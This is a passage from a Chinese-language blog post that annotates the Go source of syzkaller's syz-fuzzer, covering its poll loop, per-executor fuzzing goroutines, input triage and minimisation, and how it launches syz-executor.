href="#为每个-syz-executor-启动一个协程，正式开始-fuzz" class="headerlink" title="为每个 syz-executor 启动一个协程，正式开始 fuzz"></a>为每个 syz-executor 启动一个协程，正式开始 fuzz</h2><p>完成前面的所有准备工作之后，接下来我们终于可以正式开始进行 fuzzing 了，syz-fuzzer 会调用 <code>newProc()</code> 为每个要启动的 syz-executor 创建一个 <code>Proc</code> 实例对象（都存放在 <code>fuzzer.procs</code> 列表中），并<strong>为每个 syz-executor 启动一个新的协程负责具体的 fuzzing 工作</strong>（<code>proc.Loop()</code>）</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">if</span> r.CoverFilterBitmap != <span class="hljs-literal">nil</span> &#123;<br>fuzzer.execOpts.Flags |= ipc.FlagEnableCoverageFilter<br>&#125;<br><br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;starting %v fuzzer processes&quot;</span>, *flagProcs)<br><span class="hljs-keyword">for</span> pid := <span class="hljs-number">0</span>; pid &lt; *flagProcs; pid++ &#123;<br>proc, err := newProc(fuzzer, pid)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;failed to create proc: %v&quot;</span>, err)<br>&#125;<br>fuzzer.procs = <span class="hljs-built_in">append</span>(fuzzer.procs, proc)<br><span class="hljs-keyword">go</span> proc.loop()<br>&#125;<br><br></code></pre></td></tr></table></figure><p>最后主线程调用 <code>pollLoop()</code>，循环等待需要 poll 的情况</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">fuzzer.pollLoop()<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="0x03-pollLooop-：循环等待处理-fuzzing-协程请求，与-syz-manager-通信"><a href="#0x03-pollLooop-：循环等待处理-fuzzing-协程请求，与-syz-manager-通信" class="headerlink" title="0x03. pollLooop()：循环等待处理 fuzzing 协程请求，与 syz-manager 通信"></a>0x03. pollLooop()：循环等待处理 fuzzing 协程请求，与 syz-manager 通信</h1><p>fuzzing 的工作是由协程 <code>proc.loop()</code> 完成的，在继续深入 fuzzing 过程之前我们先来看看主线程最后还会做些什么：）</p><p>主线程在启动这些协程之后所需要做的工作其实就是响应这些协程的请求，并负责与 syz-manager 间进行 RPC 通信，通过一个不会返回的 <code>pollLoop()</code> 函数完成，该函数核心其实就是一个<strong>无限循环</strong>：</p><ul><li>循环等待 <code>ticker</code> （每 3s 响应一次的计时器）或 <code>fuzzer.needPoll</code> 这两个 channel 之一有数据传来</li><li>如果是  <code>fuzzer.needPoll</code> 传来请求或是距离上次 poll 的时间大于 10s：<ul><li>检查 workQueue 是否需要新的 candidate（candidate 数量少于 executor 数量），若不是且本次请求处理为  <code>fuzzer.needPoll</code> 传来请求，则等到到距离上次 poll 的时间大于 10s</li><li>收集 executor 数据，调用 <code>poll()</code> 通过 RPC 向 syz-manager 获取新的 candidate</li></ul></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs go">unc (fuzzer *Fuzzer) pollLoop() &#123;<br><span class="hljs-keyword">var</span> execTotal <span class="hljs-type">uint64</span><br><span class="hljs-keyword">var</span> lastPoll time.Time<br><span class="hljs-keyword">var</span> lastPrint time.Time<br>ticker := time.NewTicker(<span class="hljs-number">3</span> * time.Second * fuzzer.timeouts.Scale).C<br><span class="hljs-keyword">for</span> &#123;<br>poll := <span class="hljs-literal">false</span><br><span class="hljs-keyword">select</span> &#123;<br><span class="hljs-keyword">case</span> &lt;-ticker:<span class="hljs-comment">/* 3s 一次的计时器 */</span><br><span class="hljs-keyword">case</span> &lt;-fuzzer.needPoll: <span class="hljs-comment">/* fuzzing 协程的 poll 请求 */</span><br>poll = <span class="hljs-literal">true</span><br>&#125;<br><span class="hljs-keyword">if</span> fuzzer.outputType != OutputStdout &amp;&amp; time.Since(lastPrint) &gt; <span class="hljs-number">10</span>*time.Second*fuzzer.timeouts.Scale &#123;<br><span class="hljs-comment">// Keep-alive for manager.</span><br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;alive, executed %v&quot;</span>, execTotal)<br>lastPrint = time.Now()<br>&#125;<br><span class="hljs-comment">/* 对于计时器而言至少 10s 才 poll 一次 */</span><br><span class="hljs-keyword">if</span> poll || time.Since(lastPoll) &gt; <span class="hljs-number">10</span>*time.Second*fuzzer.timeouts.Scale &#123;<br><span class="hljs-comment">/* workqueue 里 work item 数量少于 executor 数量才 poll */</span><br>needCandidates := fuzzer.workQueue.wantCandidates()<br><span class="hljs-keyword">if</span> poll &amp;&amp; !needCandidates &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br>stats := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">uint64</span>)<br><span class="hljs-keyword">for</span> _, proc := <span class="hljs-keyword">range</span> fuzzer.procs &#123;<br>stats[<span class="hljs-string">&quot;exec total&quot;</span>] += atomic.SwapUint64(&amp;proc.env.StatExecs, <span class="hljs-number">0</span>)<br>stats[<span class="hljs-string">&quot;executor restarts&quot;</span>] += atomic.SwapUint64(&amp;proc.env.StatRestarts, <span class="hljs-number">0</span>)<br>&#125;<br><span class="hljs-keyword">for</span> stat := Stat(<span class="hljs-number">0</span>); stat &lt; StatCount; stat++ &#123;<br>v := atomic.SwapUint64(&amp;fuzzer.stats[stat], <span class="hljs-number">0</span>)<br>stats[statNames[stat]] = v<br>execTotal += v<br>&#125;<br><span class="hljs-keyword">if</span> !fuzzer.poll(needCandidates, stats) &#123;<br>lastPoll = time.Now()<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="0x04-proc-loop-：真正负责-fuzzing-的核心协程"><a href="#0x04-proc-loop-：真正负责-fuzzing-的核心协程" class="headerlink" title="0x04. proc.loop()：真正负责 fuzzing 的核心协程"></a>0x04. proc.loop()：真正负责 fuzzing 的核心协程</h1><p>下面我们来到 syz-fuzzer 的另一个核心——<strong>真正的 fuzzing 过程</strong>，syz-fuzzer 会为每个 syz-executor 启动一个新的协程负责具体的 fuzzing 工作（对于 executor 来说相当于督工和不断给任务的上司属于是），该协程对应 <code>proc.loop()</code> 函数，该函数的核心其实还是一个<strong>无限循环</strong>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(proc *Proc)</span></span> loop() &#123;<br>generatePeriod := <span class="hljs-number">100</span><br><span class="hljs-keyword">if</span> proc.fuzzer.config.Flags&amp;ipc.FlagSignal == <span class="hljs-number">0</span> &#123;<br><span class="hljs-comment">// 如果我们没有真的覆盖率信号, 更加频繁地生成程序</span><br><span class="hljs-comment">// 因为反馈信号很弱.</span><br>generatePeriod = <span class="hljs-number">2</span><br>&#125;<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; ; i++ &#123;<br></code></pre></td></tr></table></figure><h2 id="从全局-WorkQueue-中获取输入，分类处理执行"><a href="#从全局-WorkQueue-中获取输入，分类处理执行" class="headerlink" title="从全局 WorkQueue 中获取输入，分类处理执行"></a>从全局 WorkQueue 中获取输入，分类处理执行</h2><p>大循环的核心逻辑之一为不断地从全局 <code>WorkQueue</code> 中获取新的输入，按照其类型不同调用不同的处理函数，完成后又继续下一轮循环</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go">item := proc.fuzzer.workQueue.dequeue()<br><span class="hljs-keyword">if</span> item != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">switch</span> item := item.(<span class="hljs-keyword">type</span>) &#123;<br><span class="hljs-keyword">case</span> *WorkTriage:<br>proc.triageInput(item)<br><span class="hljs-keyword">case</span> *WorkCandidate:<br>proc.execute(proc.execOpts, item.p, item.flags, StatCandidate)<br><span class="hljs-keyword">case</span> *WorkSmash:<br>proc.smashInput(item)<br><span class="hljs-keyword">default</span>:<br>log.Fatalf(<span class="hljs-string">&quot;unknown work type: %#v&quot;</span>, item)<br>&#125;<br><span class="hljs-keyword">continue</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="①-proc-triageInput-：执行输入-尝试最小化后发送给-manager-并添加到本地语料库，若未-smash-则添加到-smash-队列"><a href="#①-proc-triageInput-：执行输入-尝试最小化后发送给-manager-并添加到本地语料库，若未-smash-则添加到-smash-队列" class="headerlink" title="① proc.triageInput()：执行输入&amp;尝试最小化后发送给 manager 并添加到本地语料库，若未 smash 则添加到 smash 队列"></a>① proc.triageInput()：执行输入&amp;尝试最小化后发送给 manager 并添加到本地语料库，若未 smash 则添加到 smash 队列</h3><p>该函数用来处理 WorkQueue 中的 WorkTraige，即<strong>可能会提供新覆盖率的程序</strong>：</p><ul><li>一开始先调用 <code>signalPrio()</code> 检查该输入之前执行结果的 <code>errno</code>，为 <code>0</code> 则 <code>prio |= 1 &lt;&lt; 1</code>，同时还会检查是否 <code>item.p</code> 的 <code>target</code> 不包含 <code>item.p.Calls[call]</code> 对应的调用，若是则 <code>prio |= 1 &lt;&lt; 0</code></li><li>判断是否产生了语料库中没有的新信号，若无则直接返回</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(proc *Proc)</span></span> triageInput(item *WorkTriage) &#123;<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;#%v: triaging type=%x&quot;</span>, proc.pid, item.flags)<br><br>prio := signalPrio(item.p, &amp;item.info, item.call)<br>inputSignal := signal.FromRaw(item.info.Signal, prio)<br>newSignal := proc.fuzzer.corpusSignalDiff(inputSignal)<br><span class="hljs-keyword">if</span> newSignal.Empty() &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br>callName := <span class="hljs-string">&quot;.extra&quot;</span><br>logCallName := <span class="hljs-string">&quot;extra&quot;</span><br><span class="hljs-keyword">if</span> item.call != <span class="hljs-number">-1</span> &#123;<br>callName = item.p.Calls[item.call].Meta.Name<br>logCallName = fmt.Sprintf(<span class="hljs-string">&quot;call #%v %v&quot;</span>, item.call, callName)<br>&#125;<br>log.Logf(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;triaging input for %v (new signal=%v)&quot;</span>, logCallName, newSignal.Len())<br></code></pre></td></tr></table></figure><p>完成前面的这些判断工作之后，接下来来到一个会运行三次的小循环：</p><ul><li>调用 <code>proc.executeRaw()</code> <strong>将该输入重新执行一次</strong>，若执行失败（这里的 <code>reexecutionSuccess()</code> 主要检查信号长度是否不为 0）则重新开始循环，失败 2次直接返回</li><li>获取执行所得信号与覆盖率，将覆盖率合并到 <code>inputCover</code> 中，如果 <code>rawCover</code> 为空则还会往里边放一份</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> inputCover cover.Cover<br><span class="hljs-keyword">const</span> (<br>signalRuns       = <span class="hljs-number">3</span><br>minimizeAttempts = <span class="hljs-number">3</span><br>)<br><span class="hljs-comment">// 计算输入覆盖与 non-flaky 信号以最小化.</span><br>notexecuted := <span class="hljs-number">0</span><br>rawCover := []<span class="hljs-type">uint32</span>&#123;&#125;<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; signalRuns; i++ &#123;<br>info := proc.executeRaw(proc.execOptsCover, item.p, StatTriage)<br><span class="hljs-keyword">if</span> !reexecutionSuccess(info, &amp;item.info, item.call) &#123;<br><span class="hljs-comment">// 调用未被执行或失败了.</span><br>notexecuted++<br><span class="hljs-keyword">if</span> notexecuted &gt; signalRuns/<span class="hljs-number">2</span>+<span class="hljs-number">1</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-comment">// 发生得太频繁，放弃</span><br>&#125;<br><span class="hljs-keyword">continue</span><br>&#125;<br>thisSignal, thisCover := getSignalAndCover(item.p, info, item.call)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(rawCover) == <span class="hljs-number">0</span> &amp;&amp; proc.fuzzer.fetchRawCover &#123;<br>rawCover = <span class="hljs-built_in">append</span>([]<span class="hljs-type">uint32</span>&#123;&#125;, thisCover...)<br>&#125;<br>newSignal = newSignal.Intersection(thisSignal)<br><span class="hljs-comment">// 没有 !minimized 检查的情况下 manager 在每次重启后开始丢失相当大量的覆盖率.</span><br><span class="hljs-comment">// Mechanics of this are not completely clear.</span><br><span class="hljs-keyword">if</span> newSignal.Empty() &amp;&amp; item.flags&amp;ProgMinimized == <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br>inputCover.Merge(thisCover)<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>这里这个 <code>Merge()</code> 其实笔者没太看明白 :（</p><p>目前笔者推测 <code>pc</code> 是 <code>program counter</code> ，这样比较能说得通，不过这样为什么不用 <code>map[uint32]bool</code> 呢？</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(cov *Cover)</span></span> Merge(raw []<span class="hljs-type">uint32</span>) &#123;<br>c := *cov<br><span class="hljs-keyword">if</span> c == <span class="hljs-literal">nil</span> &#123;<br>c = <span class="hljs-built_in">make</span>(Cover)<br>*cov = c<br>&#125;<br><span class="hljs-keyword">for</span> _, pc := <span class="hljs-keyword">range</span> raw &#123;<br>c[pc] = <span class="hljs-keyword">struct</span>&#123;&#125;&#123;&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure></blockquote><p>循环结束后会检查 item 的标志位，如果未设置 <code>ProgMinimized</code> 说明该输入还未进行最小化，<strong>此时调用</strong> <code>prog.Minimize()</code> <strong>将输入进行最小化</strong></p><p>这里传入的闭包函数主要是一个 <code>minimizeAttempts</code> （3）次的小循环，其中会调用 <code>proc.execute()</code> 执行最小化后的程序，执行失败则返回，若三次循环执行中无法再产生新的信号信号则返回 true，否则返回 false</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">if</span> item.flags&amp;ProgMinimized == <span class="hljs-number">0</span> &#123;<br>item.p, item.call = prog.Minimize(item.p, item.call, <span class="hljs-literal">false</span>,<br><span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(p1 *prog.Prog, call1 <span class="hljs-type">int</span>)</span></span> <span class="hljs-type">bool</span> &#123;<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; minimizeAttempts; i++ &#123;<br>info := proc.execute(proc.execOpts, p1, ProgNormal, StatMinimize)<br><span class="hljs-keyword">if</span> !reexecutionSuccess(info, &amp;item.info, call1) &#123;<br><span class="hljs-comment">// The call was not executed or failed.</span><br><span class="hljs-keyword">continue</span><br>&#125;<br>thisSignal, _ := getSignalAndCover(p1, info, call1)<br><span class="hljs-keyword">if</span> newSignal.Intersection(thisSignal).Len() == newSignal.Len() &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;)<br>&#125;<br></code></pre></td></tr></table></figure><p>最后将这个输入序列化后<strong>发送给 syz-manager 并将其添加到本地语料库中</strong>，如果未设置 <code>ProgSmashed</code> 标志位则再将这个输入放到 WorkSmash 队列中</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs go">data := item.p.Serialize()<br>sig := hash.Hash(data)<br><br>log.Logf(<span class="hljs-number">2</span>, <span class="hljs-string">&quot;added new input for %v to corpus:\n%s&quot;</span>, logCallName, data)<br>proc.fuzzer.sendInputToManager(rpctype.Input&#123;<br>Call:     callName,<br>CallID:   item.call,<br>Prog:     data,<br>Signal:   inputSignal.Serialize(),<br>Cover:    inputCover.Serialize(),<br>RawCover: rawCover,<br>&#125;)<br><br>proc.fuzzer.addInputToCorpus(item.p, inputSignal, sig)<br><br><span class="hljs-keyword">if</span> item.flags&amp;ProgSmashed == <span class="hljs-number">0</span> &#123;<br>proc.fuzzer.workQueue.enqueue(&amp;WorkSmash&#123;item.p, item.call&#125;)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="②-proc-execute-：执行输入，将有意思的输入放到-traige-队列"><a href="#②-proc-execute-：执行输入，将有意思的输入放到-traige-队列" class="headerlink" title="② proc.execute()：执行输入，将有意思的输入放到 traige 队列"></a>② proc.execute()：执行输入，将有意思的输入放到 traige 队列</h3><p>该函数的逻辑比较简单，主要便是调用 <code>proc.executeRaw()</code> 执行传入的输入，并调用 <code>checkNewSignal()</code> 检查执行的结果，将其中有意思的那些放入 traige 队列：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(proc *Proc)</span></span> execute(execOpts *ipc.ExecOpts, p *prog.Prog, flags ProgTypes, stat Stat) *ipc.ProgInfo &#123;<br>info := proc.executeRaw(execOpts, p, stat)<br><span class="hljs-keyword">if</span> info == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br>calls, extra := proc.fuzzer.checkNewSignal(p, info)<br><span class="hljs-keyword">for</span> _, callIndex := <span class="hljs-keyword">range</span> calls &#123;<br>proc.enqueueCallTriage(p, flags, callIndex, info.Calls[callIndex])<br>&#125;<br><span class="hljs-keyword">if</span> extra &#123;<br>proc.enqueueCallTriage(p, flags, <span class="hljs-number">-1</span>, info.Extra)<br>&#125;<br><span class="hljs-keyword">return</span> info<br>&#125;<br></code></pre></td></tr></table></figure><p><code>executeRaw()</code> 函数的主要逻辑其实就是先检查禁用的系统调用然后是一个伪无限循环调用 <code>proc.env.Exec()</code> 执行输入（好多层套娃），若执行失败则进行错误记录并休眠 1s 后重新进行，执行成功则直接返回</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(proc *Proc)</span></span> executeRaw(opts *ipc.ExecOpts, p *prog.Prog, stat Stat) *ipc.ProgInfo &#123;<br>proc.fuzzer.checkDisabledCalls(p)<br><br><span class="hljs-comment">// 限制并发窗口，每隔一段时间进行一次泄漏检查.</span><br>ticket := proc.fuzzer.gate.Enter()<br><span class="hljs-keyword">defer</span> proc.fuzzer.gate.Leave(ticket)<br><br>proc.logProgram(opts, p)<br><span class="hljs-keyword">for</span> try := <span class="hljs-number">0</span>; ; try++ &#123;<br>atomic.AddUint64(&amp;proc.fuzzer.stats[stat], <span class="hljs-number">1</span>)<br>output, info, hanged, err := proc.env.Exec(opts, p)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">if</span> err == prog.ErrExecBufferTooSmall &#123;<br><span class="hljs-comment">// 若我们系统地在序列化程序上失败则非常糟糕,</span><br><span class="hljs-comment">// 但目前为止除了统计以外我们没有更好的处理方式.</span><br><span class="hljs-comment">// 该错误在 seeded seeded syz_mount_image 调用上观察到很多.</span><br>atomic.AddUint64(&amp;proc.fuzzer.stats[StatBufferTooSmall], <span class="hljs-number">1</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br><span class="hljs-keyword">if</span> try &gt; <span class="hljs-number">10</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;executor %v failed %v times: %v&quot;</span>, proc.pid, try, err)<br>&#125;<br>log.Logf(<span class="hljs-number">4</span>, <span class="hljs-string">&quot;fuzzer detected executor failure=&#x27;%v&#x27;, retrying #%d&quot;</span>, err, try+<span class="hljs-number">1</span>)<br>debug.FreeOSMemory()<br>time.Sleep(time.Second)<br><span class="hljs-keyword">continue</span><br>&#125;<br>log.Logf(<span class="hljs-number">2</span>, <span class="hljs-string">&quot;result hanged=%v: %s&quot;</span>, hanged, output)<br><span class="hljs-keyword">return</span> info<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="Env-Exec-：启动-syz-executor-并将输入程序序列化后交给其执行"><a href="#Env-Exec-：启动-syz-executor-并将输入程序序列化后交给其执行" class="headerlink" title="Env.Exec()：启动 syz-executor 并将输入程序序列化后交给其执行"></a>Env.Exec()：启动 syz-executor 并将输入程序序列化后交给其执行</h4><p><code>Env.Exec()</code> 函数用来启动 syz-executor 并将输入交给其进行执行，<strong>syz-executor 在被启动后会一直等待 syz-fuzzer 传来的输入并执行</strong>，而不是每个输入都要重新启动一次 executor：</p><ul><li>首先将输入序列化到 <code>env.in</code> （作为 syz-executor 的输入，syz-executor 会反序列化后再将其执行），并将 <code>env.out</code> 的前 4 字节（<code>ncmd and nsig</code> ）置 0；这里我们注意到 syz-fuzzer 与 syz-executor 间有两种传递数据的方式：管道&#x2F;共享内存</li><li>接下来检查 executor 是否已启动，若未启动（ <code>env.cmd == nil</code> ）则调用 <code>makeCommand()</code> <strong>启动 syz-executor</strong></li><li>接下来调用 <code>cmd.exec()</code> <strong>真正开始让 syz-executor 执行程序</strong>，若出错则关闭 syz-executor（等 <code>executeRaw()</code> 的下次循环重新启动）</li><li>最后解析程序输出，返回结果</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Exec 启动 executor 二进制文件以执行程序 p 并返回关于执行的信息:</span><br><span class="hljs-comment">// output: 程序输出</span><br><span class="hljs-comment">// info: per-call info</span><br><span class="hljs-comment">// hanged: 程序挂起且被杀死</span><br><span class="hljs-comment">// err0: 启动程序失败或是 executor 自身有问题.</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(env *Env)</span></span> Exec(opts *ExecOpts, p *prog.Prog) (output []<span class="hljs-type">byte</span>, info *ProgInfo, hanged <span class="hljs-type">bool</span>, err0 <span class="hljs-type">error</span>) &#123;<br><span class="hljs-comment">// Copy-in serialized program.</span><br>progSize, err := p.SerializeForExec(env.in)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>err0 = err<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">var</span> progData []<span class="hljs-type">byte</span><br><span class="hljs-keyword">if</span> !env.config.UseShmem &#123;<br>progData = env.in[:progSize]<br>&#125;<br><span class="hljs-comment">// 清零前两个字 (ncmd and nsig), 由此若 executor 在写入非垃圾数据前崩溃，</span><br><span class="hljs-comment">// 我们在这里便没有垃圾.</span><br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++ &#123;<br>env.out[i] = <span class="hljs-number">0</span><br>&#125;<br><br>atomic.AddUint64(&amp;env.StatExecs, <span class="hljs-number">1</span>)<br><span class="hljs-keyword">if</span> env.cmd == <span class="hljs-literal">nil</span> &#123; <span class="hljs-comment">/* syz-executor 未启动 */</span><br><span class="hljs-keyword">if</span> p.Target.OS != targets.TestOS &amp;&amp; targets.Get(p.Target.OS, p.Target.Arch).HostFuzzer &#123;<br><span class="hljs-comment">// executor 实际上是 ssh,</span><br><span class="hljs-comment">// 太频繁地启动他们会导致延迟.</span><br>&lt;-rateLimit.C<br>&#125;<br>tmpDirPath := <span class="hljs-string">&quot;./&quot;</span><br>atomic.AddUint64(&amp;env.StatRestarts, <span class="hljs-number">1</span>)<br>env.cmd, err0 = makeCommand(env.pid, env.bin, env.config, env.inFile, env.outFile, env.out, tmpDirPath)<br><span class="hljs-keyword">if</span> err0 != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br>&#125;<br>output, hanged, err0 = env.cmd.exec(opts, progData)<span class="hljs-comment">/* 执行输入 